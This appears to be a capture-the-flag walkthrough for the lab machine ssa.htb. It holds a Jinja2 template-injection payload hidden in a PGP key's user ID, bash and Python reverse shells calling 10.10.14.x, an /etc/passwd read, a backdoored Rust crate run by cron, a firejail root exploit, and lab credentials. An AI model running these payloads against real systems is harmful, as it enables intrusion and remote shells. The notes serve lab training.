@@ -1,0 +1,169 @@
+Ports open are:
+ SSH, HTTP and HTTPS
+
+sudo gobuster dir -u "https://ssa.htb/" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster -t 50 -k -> Gets many hits across the website
+
+Website is made in Flask -> Python
+
+ssa.htb/contact error notes:
+ Message was encrypted with an unknown PGP key. -> maybe an exploitable vector?
+ Message is not PGP-encrypted.
+ Thank you for your submission.
+
+After tweaking around, the verify key section of the guide page we can build our own keys and signatures
+and test them out
+
+			How To Build New Key
+===============================================================================
+┌──(ender㉿UnDefineCS)-[~/.gnupg]
+└─$ gpg --full-generate-key
+
+┌──(ender㉿UnDefineCS)-[~/.gnupg]
+└─$ gpg --list-secret-keys --keyid-format=long
+gpg: checking the trustdb
+gpg: marginals needed: 3  completes needed: 1  trust model: pgp
+gpg: depth: 0  valid:   1  signed:   0  trust: 0-, 0q, 0n, 0m, 0f, 1u
+/home/ender/.gnupg/pubring.kbx
+------------------------------
+sec   rsa3072/18653FB9C23528F8 2023-07-06 [SC]
+      61EDBD8260612661FFF0C08C18653FB9C23528F8
+uid                 [ultimate] USERNAME (NA) <ender@root.com>
+ssb   rsa3072/B470FF14823A6339 2023-07-06 [E]
+
+                                                                           
+┌──(ender㉿UnDefineCS)-[~/.gnupg]
+└─$ gpg --armor --export 18653FB9C23528F8
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mQGNBGSmOosBDADIX9vzleSw0cl6avAqCX7PQRDY4Y0bhZ945Fbm+BmCATMTKZcz
+qqHIohMXKpXrC9zQGrPmb5ZGaHmUwhFAqqb1yAr/FCQMU6LdUaH1wXiUIqUmuZK0
+wMMVMryTPDqZ6SH8CKrpsVqQvbdlR1WHQyuNbwg4ilMdcpF/6h1Y+qQtsUj7gumz
++CBuhOnq8wwH0oEwrnLN7UdN5GT8GcezVH+jOj08Dcnrn72NCNfXHIchV2JjQbAb
+ZShgZ6IBbSgZlbMf9l5bNLstRMQLMP4OqscOUBG/fGjQKVpthuxNHtrclYC2f2Ni
+Y2Dzyon4jSAKBPWeP3+4o3PFK2jy/ku0f0XNazBL7fP4QtbKMYClFMNE2KhE4Lzx
+6RDlsu9u28NOUudc9Ma/oYMD1n/HjIAcyI/npYbY3kcv9/2MblPLjeF9cUd7eg7S
+uqilL0wcL9ATktb65WWyai0s6PWTvoUqIhJu8NmgLt76iuHknDU7CiIAaWqh6gAQ
+pOsMMFnKfVSgFrUAEQEAAbUBpXslIGZvciB4IGluICgpLl9fY2xhc3NfXy5fX2Jh
+c2VfXy5fX3N1YmNsYXNzZXNfXygpICV9eyUgaWYgIndhcm5pbmciIGluIHguX19u
+YW1lX18gJX17e3goKS5fbW9kdWxlLl9fYnVpbHRpbnNfX1snX19pbXBvcnRfXydd
+KCdvcycpLnBvcGVuKCJweXRob24zIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nl
+c3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NL
+X1NUUkVBTSk7cy5jb25uZWN0KChcIjEwLjEwLjE0LjU0XCIsNDQ0NCkpO29zLmR1
+cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAy
+KHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoW1wiL2Jpbi9zaFwiLCBc
+Ii1pXCJdKTsnIil9fXslZW5kaWYlfXslIGVuZGZvciAlfSAoTkEpIDxlbmRlckBy
+b290LmNvbT6JAc4EEwEKADgWIQRh7b2CYGEmYf/wwIwYZT+5wjUo+AUCZKY6iwIb
+AwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRAYZT+5wjUo+NwfC/45PLTDcjrj
+ADwGUl8+kDaVkTe8Jz1Zy8E1WjmyNXm8hRSdj45lKFf85/REG6yaQFaVpoH9nBdW
+aJV3c1+fWlZ2Ibx+dCs/fVLNTDyMsgLlEW1QixEOovUDbLBURx5v+UPLZ0K3Qi0S
+ZXTefqtnT9BSuMAlvPmpDxtp4FHsblIiOQ//2DR8IJbmioNhjNofrlPK4yCXI7FH
+/Qw9bp5GOQAlnLaCMxRsuNAszYRYLimp2crqRsF0REyEPEPUxeE5e+JcTrb4C27F
+Q9S6zyN1PHsmwt5RiOM/gCH2CBam3uc2boWfaKdDWgjw8NkbqTM2E54ZfPGxqxwA
+Ujnwu8rNQr9azSpYYX7JRm9lWwfrwrEw63A0cxEXjrsp/hmuvKzxSKhC7qLxVYgh
+clIMce11JpkpjjFdsU/nS4JyZHdyXb8/nmGYFq9u5CkxSZ3JLekRc/Q3Vdt5q90j
+4mxgVMPaznnrRZQOypZFWZSIMifbWfaZqty2yzn94JtmVMXrjg4MRS65AY0EZKY6
+iwEMAMUjJPJCd0o30R5EcfR6k8ehTCoE7KTmpvbk4i3tdoTFyvmsE1UM2h3mE1Hq
+cdJ3WO79vnh5uQAZvBzWj//Vdqc3ehk6RgQ8Opkn3T7Ge7Y8wa3sH6YA9R1Bp0YX
+eEmTt6hXYBVfsd9PQfkhAQcH+cdwe/dXkV7PLOA6yIyXQrth73st2hh8sPW/tKRW
+abpQUjC3epJr1DP9cw3ugtNWPrPU7PZI4un4KqlMgN652tbUvp6/frRNbm8Rsl/W
+HEwmw2vrk+lNg8kCizbHq1O0do/jytxaabGLywqOaY8q3phz5GBOSPPvqOY0dPPj
+hrZ3/gbgG8aZvxHAPYSei1VZr/I+NzeJBtK9Tl/gPmRpTs9UDHYCLN+ttI/tO0jL
+aiUvBRETlSM1PbioPzR4oYJw471J1bEKSxbNZc27ftePTyyQ6k1yBSlmgCnDHGAd
+uLQOD2Zea6xMWMUZKUcSbfyWPUHUk4hkcHNJzk+nkl/h8kXF+m+jo9WMrFYyzN90
+p4GASQARAQABiQG2BBgBCgAgFiEEYe29gmBhJmH/8MCMGGU/ucI1KPgFAmSmOosC
+GwwACgkQGGU/ucI1KPj4qAv9Fs92ZdO0LSERZSjYg+OhkvNsk6s+NB/37Mz5Kltn
+84HrhdL9E4kPuCV9ce3vqDVwQNJQoKBbV1FZvMWD6ys0oeWqOc8H4lmEE53L5eNj
+kCEXN5uGmDGgfXSTmG0k3rtGPGULYxhndgRbBIJfhmUW6lATCDQkEne0My8m8BbQ
+CF7UpifPVym/4hDcO4ep7qMdnxCZymn2Un3sRO2K2Q1QrXfEfEaRDppgfzI55EB3
+sNymDUqpNVuLug4DuDBbWiPEhQb5OWtdMBNLWd5ElgI8K0F1nFKRVAy0StJbmOtt
+oWDnhtOZ9kr+FZJFWQZgTnbNfZRdN5rM6FQP8lANiwf+Cu1sFoLH/ArWtUJf15qc
+oM4NLt0t4lGppKtHNQVjNSdGsFGhCGuIZXf/Oljd41rH61tzYGA+wBapGerGMjOp
++YEieXOQHhMG1dtWIcST9qVwO27ReT11UitoEJz9Ja9NBXnt8sC0Dpn2AjRMPA0j
+kiaJDm8o/tqmOgnmdxLOsT5X
+=pLsH
+-----END PGP PUBLIC KEY BLOCK-----
+===============================================================================
+
+echo 'Honka Tonka :p' | gpg --clear-sign > custom.sig -> This gives us a signature we can use on the site
+
+When we run the verify correctly we can read the output and see the UID we entered is appearing
+we can attempt python SSTI methods, the site is running Flask, with brute force we can determine frameworks
+
+Site is using Jinja2
+
+   Auto PGP Key Script Stuff
+----------------------------------
+1.) gpg --full-generate-key
+2.) gpg --list-secret-keys --keyid-format=long
+3.) gpg --armor --export INPUT
+----------------------------------
+
+Using hacktricks lab.py code for jinja2 ssti injections we can play around locally and build our payload:
+	https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
+
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ -> payload source
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }} -> read file
+
+{{request.application.__globals__.__builtins__.__import__('os').system('cmd')}}
+
+bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1" -> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80NDQ0IDA+JjEiCg==
+
+
+{{request.application.__globals__.__builtins__.__import__('os').system('echo -n "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80NDQ0IDA+JjEiCg=="|base64 -d|bash')}} -> works!
+
+Shell as Atlas seems to be Jailed in some sort, lots of missing commands such as: find, which, nc, wget, curl, etc
+
+mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA -> strange uri
+
+gpg passphrase : $M1DGu4rD$
+
+Inside of one of the python files we fetched off the box we find possible creds
+	atlas:GarlicAndOnionZ42
+	
+~/.config/ -> verifies that we are in a firejail sandbox!
+
+~/.config/httpie/sessions/localhost_5000 -> has some data!
+	silentobserver:quietLiketheWind22 -> SSH Creds -> works on ssa.htb/login
+	cookie:eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA
+	
+	SSH User = { silentobserver:quietLiketheWind22 }
+
+===============================================================
+
+2023/07/09 19:24:01 CMD: UID=0     PID=86970  | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
+2023/07/09 19:24:01 CMD: UID=0     PID=86972  | /usr/sbin/CRON -f -P 
+2023/07/09 19:24:01 CMD: UID=0     PID=86973  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
+2023/07/09 19:24:01 CMD: UID=0     PID=86974  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
+2023/07/09 19:24:01 CMD: UID=0     PID=86975  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
+2023/07/09 19:24:01 CMD: UID=1000  PID=86976  | rustc -vV 
+2023/07/09 19:24:01 CMD: UID=1000  PID=86977  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed                                                                         
+2023/07/09 19:24:01 CMD: UID=1000  PID=86979  | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg                                                                      
+2023/07/09 19:24:01 CMD: UID=1000  PID=86981  | /usr/bin/cargo run --offline 
+2023/07/09 19:24:11 CMD: UID=0     PID=86985  | 
+2023/07/09 19:24:11 CMD: UID=0     PID=86986  | /bin/rm -r /opt/crates 
+2023/07/09 19:24:11 CMD: UID=0     PID=86987  | /bin/cp -rp /root/Cleanup/crates /opt/ 
+2023/07/09 19:24:11 CMD: UID=0     PID=86988  | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
+
+strings /opt/tipnet/target/debug/tipnet | grep -i "lib.rs" -> shows a lot of stuff dealing with the atlas user
+
+find / -type d -writable -print 2>/dev/null -> writeable folders
+find / -type f -writable -print 2>/dev/null -> writeable files
+
+find / -name "lib.rs" 2>/dev/null -> /opt/crates/logger/src/lib.rs -> can read
+find / -type f -writable -print 2>/dev/null | grep -v "/home\|/proc\|/etc\|sys" -> writable files
+
+main.rs => combination of the lib.rs and rev shell rs code from : https://raw.githubusercontent.com/LukeDSchenk/rust-backdoors/master/reverse-shell/src/main.rs
+
+cp main.rs /opt/crates/logger/src/lib.rs -> Gets a hit from atlas outside of the jail!
+	Being outside the jail we can write a new ssh-key into atlas and ssh into the machine as atlas!
+
+./tipnet and hitting option e will get us a shell as atlas -> tipnet is possibly writable by atlas
+
+As Atlas in SSH we can see Atlas can run firejail, seaching online there is an exploit.py that escs us to root
+	https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
+	
+We just run python3 exploit.py and follow the instructions, then it tells us using sudo su - we can shell as root
+	BUT in reality the command is `su -`
+
+root:d87b2a186d6fda64741928733d87fc04
